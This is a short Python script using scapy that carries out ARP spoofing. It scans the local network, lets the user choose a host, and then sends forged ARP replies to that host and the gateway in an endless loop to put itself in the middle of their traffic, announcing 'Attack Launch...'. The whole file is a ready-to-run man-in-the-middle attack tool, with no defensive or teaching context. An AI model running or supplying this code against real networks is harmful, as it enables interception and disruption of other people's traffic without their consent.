from scapy.all import ARP, send
from Scan import *
import time

def create_arp(sender_ip, target_mac, target_ip):
    packet = ARP(op=2,psrc = sender_ip , hwdst=target_mac, pdst=target_ip)
    return packet

def arp_spoofing(target_ipv4):
    target_addr = get_addr_inf(target_ipv4)
    gateway_addr = get_addr_inf(get_gateway_inf()[2])
    packet1 = create_arp(target_addr[1], gateway_addr[0], gateway_addr[1])
    packet2 = create_arp(gateway_addr[1], target_addr[0], target_addr[1])

    try:
        while True:
            try:
                send(packet1, verbose=False)
                send(packet2, verbose=False)
            except Exception as e:
                print(f"An error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
        return


if __name__ == "__main__":

    ip_list = scan_host()
    choice = int(input("No: "))
    if 0 <= choice < len(ip_list):
        target_ip = ip_list[choice]
        print(target_ip)
    else:
        print("Invalid choice, please select a valid number from the list.")

    if target_ip:
        
        print("Attack Launch...")
        try:
            arp_spoofing(target_ip)
        except KeyboardInterrupt:
            exit(0)
